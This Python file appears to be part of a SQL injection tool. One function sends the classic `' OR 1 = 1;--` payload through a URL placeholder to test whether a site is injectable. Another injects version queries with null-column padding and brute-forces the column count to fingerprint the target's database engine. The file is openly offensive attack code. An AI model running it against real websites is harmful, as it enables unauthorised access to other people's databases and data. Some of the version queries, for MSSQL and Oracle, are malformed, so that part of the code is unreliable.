from enum import Enum
from requests import request


class State(Enum):
    Error = 0
    Success = 1
    Ambiguous = 2


class DBMS_Type(Enum):
    AMBIGUOUS = 0
    SQLITE = 1
    MSSQL = 2
    MYSQL = 3
    POSTGRESQL = 4
    ORACLESQL = 5
    SQLSERVER = 6


class DBMS_VERSION_STRING(Enum):
    SQLITE = 'SELECT sqlite_version()'
    MSSQL = 'SELECT @@VERSION()'
    MYSQL = 'SELECT VERSION()'
    POSTGRESQL = 'SELECT version()'
    ORACLESQL = 'SELECT v$version'
    SQLSERVER = 'SELECT @@VERSION()'


def is_injectable(url, success_str, error_str):
    target = url.replace("FUZZ", "' OR 1 = 1;--")
    response = request("get", target)
    response = response.text

    if response is None:
        return State.Error

    if success_str in response and error_str in response:
        return State.Ambiguous
    elif success_str in response:
        return State.Success
    else:
        return State.Error


def determine_dbms(opts, poison, columns=1, brute_force=False):
    sql_version = None
    brute_force_limit = 20

    if brute_force and brute_force_limit <= columns:
        return None

    for version_string in DBMS_VERSION_STRING:
        nulls = "".join([",null" for _ in range(0, columns-1)])
        poison_str = poison + version_string.value + nulls + ";--"

        target = opts.URL.replace("FUZZ", poison_str)
        result = request("get", target).text

        if opts.SUCCESS_STR in result and opts.ERROR_STR in result:
            sql_version = DBMS_Type.AMBIGUOUS
        elif opts.SUCCESS_STR in result:
            sql_version = DBMS_Type[version_string.name]
            break

    if brute_force and sql_version is None:
        return determine_dbms(opts, poison, columns + 1, True)

    # update correct column size
    opts.COLUMNS = columns

    return sql_version
